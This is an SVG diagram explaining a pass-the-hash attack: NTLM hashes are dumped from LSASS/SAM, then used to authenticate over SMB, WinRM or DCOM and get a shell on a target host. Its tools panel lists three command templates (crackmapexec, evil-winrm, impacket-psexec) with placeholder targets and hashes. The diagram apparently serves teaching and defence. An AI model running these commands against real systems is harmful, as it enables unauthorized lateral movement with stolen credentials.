<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 260" width="800" height="260">
  <defs>
    <marker id="arr" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#555555"/>
    </marker>
  </defs>
  <rect width="800" height="260" fill="#0d0d0d"/>
  <text x="16" y="22" font-family="Courier New, monospace" font-size="13" font-weight="bold" fill="#e0e0e0">Pass-the-Hash Attack Flow</text>

  <!-- Step 1: credential dump source -->
  <rect x="20" y="80" width="140" height="60" fill="#161616" stroke="#ff4444" stroke-width="1.5" rx="2"/>
  <text x="90" y="102" font-family="Courier New, monospace" font-size="11" fill="#ff4444" text-anchor="middle">LSASS / SAM</text>
  <text x="90" y="117" font-family="Courier New, monospace" font-size="9" fill="#888888" text-anchor="middle">credential store</text>
  <text x="90" y="130" font-family="Courier New, monospace" font-size="9" fill="#444444" text-anchor="middle">requires local admin</text>

  <!-- Step 2: Attacker with hash -->
  <rect x="220" y="80" width="140" height="60" fill="#161616" stroke="#00c732" stroke-width="1.5" rx="2"/>
  <text x="290" y="102" font-family="Courier New, monospace" font-size="11" fill="#00c732" text-anchor="middle">ATTACKER</text>
  <text x="290" y="117" font-family="Courier New, monospace" font-size="9" fill="#888888" text-anchor="middle">has NTLM hash</text>
  <text x="290" y="130" font-family="Courier New, monospace" font-size="9" fill="#666666" text-anchor="middle">no plaintext needed</text>

  <!-- Step 3: PTH over SMB/WinRM -->
  <rect x="420" y="80" width="150" height="60" fill="#161616" stroke="#00c732" stroke-width="1.5" rx="2"/>
  <text x="495" y="102" font-family="Courier New, monospace" font-size="11" fill="#00c732" text-anchor="middle">PTH AUTH</text>
  <text x="495" y="117" font-family="Courier New, monospace" font-size="9" fill="#888888" text-anchor="middle">SMB / WinRM / DCOM</text>
  <text x="495" y="130" font-family="Courier New, monospace" font-size="9" fill="#444444" text-anchor="middle">NTLM handshake w/ hash</text>

  <!-- Step 4: Target host -->
  <rect x="630" y="80" width="140" height="60" fill="#161616" stroke="#00b3cc" stroke-width="1.5" rx="2"/>
  <text x="700" y="102" font-family="Courier New, monospace" font-size="11" fill="#00b3cc" text-anchor="middle">TARGET HOST</text>
  <text x="700" y="117" font-family="Courier New, monospace" font-size="9" fill="#ffcc00" text-anchor="middle">SHELL / RCE</text>
  <text x="700" y="130" font-family="Courier New, monospace" font-size="9" fill="#444444" text-anchor="middle">no credentials typed</text>

  <!-- Arrows -->
  <line x1="160" y1="110" x2="220" y2="110" stroke="#555555" stroke-width="1.5" marker-end="url(#arr)"/>
  <text x="190" y="103" font-family="Courier New, monospace" font-size="9" fill="#444444" text-anchor="middle">dump hash</text>

  <line x1="360" y1="110" x2="420" y2="110" stroke="#555555" stroke-width="1.5" marker-end="url(#arr)"/>
  <text x="390" y="103" font-family="Courier New, monospace" font-size="9" fill="#444444" text-anchor="middle">inject hash</text>

  <line x1="570" y1="110" x2="630" y2="110" stroke="#555555" stroke-width="1.5" marker-end="url(#arr)"/>
  <text x="600" y="103" font-family="Courier New, monospace" font-size="9" fill="#444444" text-anchor="middle">auth success</text>

  <!-- Tools -->
  <rect x="20" y="170" width="760" height="65" fill="#0d1a0d" stroke="#1e3a1e" rx="2"/>
  <text x="30" y="186" font-family="Courier New, monospace" font-size="10" fill="#666666">Common tools:</text>
  <text x="30" y="201" font-family="Courier New, monospace" font-size="10" fill="#444444">  crackmapexec smb &lt;target&gt; -u admin -H &lt;NTLM_HASH&gt; --local-auth</text>
  <text x="30" y="216" font-family="Courier New, monospace" font-size="10" fill="#444444">  evil-winrm -i &lt;target&gt; -u administrator -H &lt;NTLM_HASH&gt;</text>
  <text x="30" y="230" font-family="Courier New, monospace" font-size="10" fill="#444444">  impacket-psexec domain/admin@&lt;target&gt; -hashes :&lt;NTLM_HASH&gt;</text>
</svg>
